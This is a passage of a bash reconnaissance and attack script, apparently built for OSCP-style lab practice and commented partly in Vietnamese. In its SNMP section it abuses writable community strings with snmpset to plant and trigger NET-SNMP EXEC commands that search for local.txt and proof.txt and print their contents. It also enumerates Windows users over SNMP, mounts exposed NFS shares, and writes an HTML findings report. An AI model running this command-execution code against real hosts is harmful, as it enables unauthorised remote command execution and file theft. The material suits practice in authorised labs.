                            proof_content=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.8072.1.3.2.3.1.2.107 2>/dev/null | sed 's/.*STRING: //')
                            
                            if [ -n "$proof_content" ]; then
                                echo "[!] Successfully read proof.txt: $proof_content"
                                echo "$proof_content" > "$OUTPUT_DIR/snmp_scans/proof_txt_content.txt"
                                save_vulnerability "161" "SNMP" "File Read: proof.txt" "Critical" "SNMP allowed reading of proof.txt file with content: $proof_content" ""
                            else
                                echo "[-] Failed to read proof.txt content"
                            fi
                        else
                            echo "[-] Could not find proof.txt anywhere"
                        fi
                    fi
                else
                    echo "[-] NET-SNMP EXTEND not supported, trying alternative method..."
                    
                    # TÍNH NĂNG MỚI: Thử phương thức EXEC
                    echo "[+] Testing if NET-SNMP EXEC is supported..."
                    if snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8 &>/dev/null; then
                        echo "[+] NET-SNMP EXEC appears to be supported."
                        
                        # Đọc file local.txt bằng EXEC
                        echo "[+] Attempting to find and read local.txt using EXEC method..."
                        # Thiết lập lệnh để tìm local.txt
                        snmpset -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.2.10 s "find /home -name local.txt -exec cat {} \\;" &>/dev/null
                        snmpset -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.1.10 i 1 &>/dev/null
                        
                        # Đọc kết quả
                        local_content=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.3.10 2>/dev/null | sed 's/.*STRING: //')
                        
                        if [ -n "$local_content" ]; then
                            echo "[!] Successfully read local.txt: $local_content"
                            echo "$local_content" > "$OUTPUT_DIR/snmp_scans/local_txt_content.txt"
                            save_vulnerability "161" "SNMP" "File Read: local.txt" "Critical" "SNMP allowed reading of local.txt file with content: $local_content" ""
                        else
                            echo "[-] Failed to read local.txt in /home, trying broader search..."
                            
                            # Tìm kiếm rộng hơn
                            snmpset -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.2.11 s "find / -name local.txt -exec cat {} \\;" &>/dev/null
                            snmpset -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.1.11 i 1 &>/dev/null
                            
                            # Đọc kết quả
                            local_content=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.3.11 2>/dev/null | sed 's/.*STRING: //')
                            
                            if [ -n "$local_content" ]; then
                                echo "[!] Successfully read local.txt: $local_content"
                                echo "$local_content" > "$OUTPUT_DIR/snmp_scans/local_txt_content.txt"
                                save_vulnerability "161" "SNMP" "File Read: local.txt" "Critical" "SNMP allowed reading of local.txt file with content: $local_content" ""
                            else
                                echo "[-] Could not find or read local.txt anywhere"
                            fi
                        fi
                        
                        # Đọc file proof.txt bằng EXEC
                        echo "[+] Attempting to find and read proof.txt using EXEC method..."
                        # Thiết lập lệnh để tìm proof.txt
                        snmpset -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.2.12 s "find /root -name proof.txt -exec cat {} \\;" &>/dev/null
                        snmpset -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.1.12 i 1 &>/dev/null
                        
                        # Đọc kết quả
                        proof_content=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.3.12 2>/dev/null | sed 's/.*STRING: //')
                        
                        if [ -n "$proof_content" ]; then
                            echo "[!] Successfully read proof.txt: $proof_content"
                            echo "$proof_content" > "$OUTPUT_DIR/snmp_scans/proof_txt_content.txt"
                            save_vulnerability "161" "SNMP" "File Read: proof.txt" "Critical" "SNMP allowed reading of proof.txt file with content: $proof_content" ""
                        else
                            echo "[-] Failed to read proof.txt in /root, trying broader search..."
                            
                            # Tìm kiếm rộng hơn
                            snmpset -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.2.13 s "find / -name proof.txt -exec cat {} \\;" &>/dev/null
                            snmpset -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.1.13 i 1 &>/dev/null
                            
                            # Đọc kết quả
                            proof_content=$(snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.2021.8.1.3.13 2>/dev/null | sed 's/.*STRING: //')
                            
                            if [ -n "$proof_content" ]; then
                                echo "[!] Successfully read proof.txt: $proof_content"
                                echo "$proof_content" > "$OUTPUT_DIR/snmp_scans/proof_txt_content.txt"
                                save_vulnerability "161" "SNMP" "File Read: proof.txt" "Critical" "SNMP allowed reading of proof.txt file with content: $proof_content" ""
                            else
                                echo "[-] Could not find or read proof.txt anywhere"
                            fi
                        fi
                    else
                        echo "[-] Neither EXTEND nor EXEC methods are supported. Cannot read files via SNMP."
                    fi
                fi
            else
                # TÍNH NĂNG MỚI: Nếu là Windows, thử phương pháp khác
                echo "[+] Detected Windows-based system. Attempting Windows-specific enumeration..."
                
                # Liệt kê các user và thư mục home trên Windows
                snmpwalk -v1 -c $community $TARGET .1.3.6.1.4.1.77.1.2.25 > "$OUTPUT_DIR/snmp_scans/windows_users.txt" 2>/dev/null
                
                echo "[+] Getting Windows installation path for file search..."
                # Liệt kê ổ đĩa và thư mục
                snmpwalk -v1 -c $community $TARGET .1.3.6.1.2.1.25.2.3.1.3 > "$OUTPUT_DIR/snmp_scans/windows_drives.txt" 2>/dev/null
                
                echo "[*] Windows systems typically require additional access method beyond SNMP for file reading."
                echo "[*] Collected user and system information. Consider using other vectors for file access."
                echo "[*] Recommended locations to search for flags on Windows:"
                echo "    - C:\\Users\\*\\Desktop\\local.txt"
                echo "    - C:\\Users\\Administrator\\Desktop\\proof.txt"
            fi
        done
    fi
    
    # Thực hiện quét SNMP chi tiết với nmap
    nmap -sU -p 161 --script=snmp-netstat,snmp-processes,snmp-win32-shares $TARGET -oN "$OUTPUT_DIR/snmp_scans/nmap_snmp_detailed.txt"
fi

# TÍNH NĂNG MỚI: Kiểm tra dịch vụ NFS
if echo "$OPEN_PORTS" | grep -q "2049"; then
    echo "[+] NFS service detected, running advanced NFS enumeration..."
    
    # Create directory for NFS scans
    mkdir -p "$OUTPUT_DIR/nfs_scans"
    
    # List NFS shares
    echo "[+] Listing NFS shares..."
    showmount -e $TARGET > "$OUTPUT_DIR/nfs_scans/showmount.txt" 2>&1
    
    # Scan with nmap
    nmap -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs $TARGET -oN "$OUTPUT_DIR/nfs_scans/nmap_nfs.txt"
    
    # Check if there are any exposed shares
    if grep -q "Export list" "$OUTPUT_DIR/nfs_scans/showmount.txt"; then
        echo "[!] Found accessible NFS shares!"
        
        # Extract shares
        grep -v "Export list" "$OUTPUT_DIR/nfs_scans/showmount.txt" | while read -r share; do
            # Clean up the share name
            share_name=$(echo "$share" | awk '{print $1}')
            
            echo "[+] Found share: $share_name"
            
            # Create mount point
            mkdir -p "$OUTPUT_DIR/nfs_scans/mounts"
            mount_dir="$OUTPUT_DIR/nfs_scans/mounts/$(echo $share_name | tr '/' '_')"
            mkdir -p "$mount_dir"
            
            # Try to mount
            echo "[+] Attempting to mount $share_name to $mount_dir"
            mount -t nfs -o nolock,ro $TARGET:$share_name "$mount_dir" 2> "$OUTPUT_DIR/nfs_scans/mount_error_$share_name.txt"
            
            # Check if mount was successful
            if [ $? -eq 0 ]; then
                echo "[!] Successfully mounted $share_name!"
                save_vulnerability "2049" "NFS" "NFS Share Accessible: $share_name" "High" "The NFS share '$share_name' is accessible without authentication, potentially exposing sensitive data." ""
                
                # List contents
                find "$mount_dir" -type f -exec ls -la {} \; > "$OUTPUT_DIR/nfs_scans/contents_${share_name// /_}.txt" 2>/dev/null
                
                # Unmount after finishing
                umount "$mount_dir"
            else
                echo "[-] Failed to mount $share_name"
            fi
        done
    fi
fi

# Generate HTML report
echo "[+] Generating HTML report..."

# Create HTML report
cat > "$OUTPUT_DIR/report.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>OSCP+ Advanced Reconnaissance Report - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; color: #333; }
        h1, h2, h3 { color: #0066cc; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background-color: #f5f5f5; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .section { margin-bottom: 30px; background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .port-info { margin-bottom: 10px; }
        .vulnerability { color: #cc0000; font-weight: bold; }
        .severity-critical { background-color: #ffdddd; color: #cc0000; padding: 3px 6px; border-radius: 3px; font-weight: bold; }
        .severity-high { background-color: #ffeecc; color: #ff6600; padding: 3px 6px; border-radius: 3px; font-weight: bold; }
        .severity-medium { background-color: #ffffcc; color: #999900; padding: 3px 6px; border-radius: 3px; font-weight: bold; }
        .severity-low { background-color: #e6f2ff; color: #0066cc; padding: 3px 6px; border-radius: 3px; font-weight: bold; }
        pre { background-color: #f5f5f5; padding: 10px; border-radius: 3px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f2f2f2; }
        tr:hover { background-color: #f5f5f5; }
        .footer { text-align: center; margin-top: 30px; font-size: 0.8em; color: #666; }
        .service-icon { width: 20px; height: 20px; margin-right: 5px; vertical-align: middle; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>OSCP+ Advanced Reconnaissance Report</h1>
            <p><strong>Target:</strong> $TARGET</p>
            <p><strong>Date:</strong> $(date)</p>
            <p><strong>Generated by:</strong> OSCP+ Advanced Recon Script</p>
        </div>

        <div class="section">
            <h2>Executive Summary</h2>
            <p>This report contains the results of an automated reconnaissance scan performed on $TARGET. The scan identified $(cat $OUTPUT_DIR/open_ports.txt | wc -l) open ports and $(cat $OUTPUT_DIR/vulnerabilities_list.md | wc -l) potential vulnerabilities.</p>
            <p>The most critical findings are highlighted below:</p>
            <ul>
EOF

# Add critical vulnerabilities to summary
grep "Critical" "$OUTPUT_DIR/vulnerabilities_list.md" | while read -r line; do
    port=$(echo "$line" | awk -F'|' '{print $1}' | tr -d ' ')
    service=$(echo "$line" | awk -F'|' '{print $2}' | tr -d ' ')
    vuln=$(echo "$line" | awk -F'|' '{print $3}' | tr -d ' ')
    
    echo "<li class=\"vulnerability\">$service on port $port: $vuln</li>" >> "$OUTPUT_DIR/report.html"
done

cat >> "$OUTPUT_DIR/report.html" << EOF
            </ul>
        </div>

        <div class="section">
            <h2>Open Ports</h2>
            <table>
                <tr>
                    <th>Port</th>
                    <th>Service</th>
                    <th>Version</th>
                </tr>
EOF

# Add port information
if [ -f "$OUTPUT_DIR/nmap_detailed.nmap" ]; then
    grep -A 100 "PORT" "$OUTPUT_DIR/nmap_detailed.nmap" | grep "open" | grep -v "filtered" | while read -r line; do
        port=$(echo "$line" | awk '{print $1}')
        state=$(echo "$line" | awk '{print $2}')
        service=$(echo "$line" | awk '{print $3}')
        version=$(echo "$line" | cut -d' ' -f4- | sed 's/^[ \t]*//')
        
        cat >> "$OUTPUT_DIR/report.html" << EOF
                <tr>
                    <td>$port</td>
                    <td>$service</td>
                    <td>$version</td>
                </tr>
EOF
    done
fi

cat >> "$OUTPUT_DIR/report.html" << EOF
            </table>
        </div>

        <div class="section">
            <h2>Vulnerabilities</h2>
            <table>
                <tr>
                    <th>Port</th>
                    <th>Service</th>
                    <th>Vulnerability</th>
                    <th>Severity</th>
                </tr>
EOF

# Add vulnerability information (skipping header lines)
tail -n +4 "$OUTPUT_DIR/vulnerabilities_list.md" | while read -r line; do
    port=$(echo "$line" | cut -d'|' -f2 | tr -d ' ')
    service=$(echo "$line" | cut -d'|' -f3 | tr -d ' ')
    vuln=$(echo "$line" | cut -d'|' -f4 | tr -d ' ')
    severity=$(echo "$line" | cut -d'|' -f5 | tr -d ' ')
    
    # Set severity class
    severity_class="severity-medium"
    if [[ "$severity" == "Critical" ]]; then
        severity_class="severity-critical"
    elif [[ "$severity" == "High" ]]; then
        severity_class="severity-high"
    elif [[ "$severity" == "Low" ]]; then
        severity_class="severity-low"
    fi
    
    cat >> "$OUTPUT_DIR/report.html" << EOF
                <tr>
                    <td>$port</td>
                    <td>$service</td>
                    <td>$vuln</td>
                    <td><span class="$severity_class">$severity</span></td>
                </tr>
EOF
done

cat >> "$OUTPUT_DIR/report.html" << EOF
            </table>
        </div>
EOF

# Add web sections if applicable
if [ -d "$OUTPUT_DIR/web_scans" ]; then
    cat >> "$OUTPUT_DIR/report.html" << EOF
        <div class="section">
            <h2>Web Services</h2>
EOF

    # Loop through web scan directories
    for port_dir in "$OUTPUT_DIR/web_scans"/*; do
        if [ -d "$port_dir" ]; then
            port=$(basename "$port_dir")
            
            # Determine protocol
            proto="http"
            if [ "$port" == "443" ] || [ "$port" == "8443" ]; then
                proto="https"
            fi
            
            cat >> "$OUTPUT_DIR/report.html" << EOF
            <h3>$proto://$TARGET:$port</h3>
EOF
            
            # Add screenshot if available
            if [ -f "$port_dir/screenshot.png" ]; then
                cat >> "$OUTPUT_DIR/report.html" << EOF
            <img src="web_scans/$port/screenshot.png" alt="Screenshot of $proto://$TARGET:$port" style="max-width: 800px; border: 1px solid #ddd; margin-bottom: 15px;">
EOF
            fi
            
            # Add technologies
            if [ -f "$port_dir/technologies.txt" ]; then
                cat >> "$OUTPUT_DIR/report.html" << EOF
            <h4>Technologies Detected</h4>
            <pre>$(cat "$port_dir/technologies.txt")</pre>
EOF
            fi
            
            # Add recursive directory scan results
            if [ -d "$port_dir/recursive_scan" ]; then
                cat >> "$OUTPUT_DIR/report.html" << EOF
            <h4>Directory Enumeration Results</h4>
            <h5>Interesting Directories & Files</h5>
            <table>
                <tr>
                    <th>Path</th>
                    <th>Notes</th>
                </tr>
EOF
                
                # Add interesting paths from recursive scans
                if [ -d "$port_dir/recursive_scan/interesting_paths" ]; then
                    for path_file in "$port_dir/recursive_scan/interesting_paths/"*; do
                        if [ -f "$path_file" ]; then
                            file_type=$(basename "$path_file" | sed 's/\.txt//')
                            
                            while read -r line; do
                                path=$(echo "$line" | awk '{print $1}')
                                
                                cat >> "$OUTPUT_DIR/report.html" << EOF
                <tr>
                    <td>$path</td>
                    <td>$file_type</td>
                </tr>
EOF
                            done < "$path_file"
                        fi
                    done
                fi
                
                cat >> "$OUTPUT_DIR/report.html" << EOF
            </table>
EOF
            fi
            
            # Add directory brute force results
            if [ -d "$port_dir/dirsearch" ] || [ -d "$port_dir/gobuster" ]; then
                cat >> "$OUTPUT_DIR/report.html" << EOF
            <h4>Additional Directories and Files</h4>
            <table>
                <tr>
                    <th>Path</th>
                    <th>Status Code</th>
                </tr>
EOF
                
                # Add dirsearch results
                if [ -f "$port_dir/dirsearch/results.txt" ]; then
                    grep -v "^$\|^#" "$port_dir/dirsearch/results.txt" | tail -n +2 | while read -r line; do
                        path=$(echo "$line" | awk '{print $1}')
                        status=$(echo "$line" | awk '{print $2}')
                        
                        cat >> "$OUTPUT_DIR/report.html" << EOF
                <tr>
                    <td>$path</td>
                    <td>$status</td>
                </tr>
EOF
                    done
                fi
                
                # Add gobuster results
                if [ -f "$port_dir/gobuster/common.txt" ]; then
                    grep -v "^$" "$port_dir/gobuster/common.txt" | while read -r line; do
                        path=$(echo "$line" | awk '{print $1}')
                        status=$(echo "$line" | awk '{print $2}')
                        
                        cat >> "$OUTPUT_DIR/report.html" << EOF
                <tr>
                    <td>$path</td>
                    <td>$status</td>
                </tr>
EOF
                    done
                fi
                
                cat >> "$OUTPUT_DIR/report.html" << EOF
            </table>
EOF
            fi
        fi
    done
    
    cat >> "$OUTPUT_DIR/report.html" << EOF
        </div>
EOF
fi

# Add service version detection section
if [ -f "$OUTPUT_DIR/service_versions.txt" ]; then
    cat >> "$OUTPUT_DIR/report.html" << EOF
        <div class="section">
            <h2>Service Version Detection</h2>
            <pre>$(cat "$OUTPUT_DIR/service_versions.txt")</pre>
        </div>
EOF
fi

# Close the HTML
cat >> "$OUTPUT_DIR/report.html" << EOF
        <div class="footer">
            <p>Generated by OSCP+ Advanced Reconnaissance Script on $(date)</p>
        </div>
    </div>
</body>
</html>
EOF

echo "[+] Reconnaissance completed!"
echo "[+] Results saved to: $OUTPUT_DIR/"
echo "[+] HTML report: $OUTPUT_DIR/report.html"
echo "[+] Vulnerabilities list: $OUTPUT_DIR/vulnerabilities_list.md"
echo ""
echo "[+] Next steps:"
echo "  1. Review the HTML report in your browser"
echo "  2. Examine vulnerabilities in $OUTPUT_DIR/vulnerabilities directory"
echo "  3. Review service-specific scan results in the respective directories"
echo "  4. Check discovered directories in web_scans/*/recursive_scan/"
echo "  5. Analyze service versions in service_versions.txt"
echo "  6. Proceed with targeted exploitation based on findings"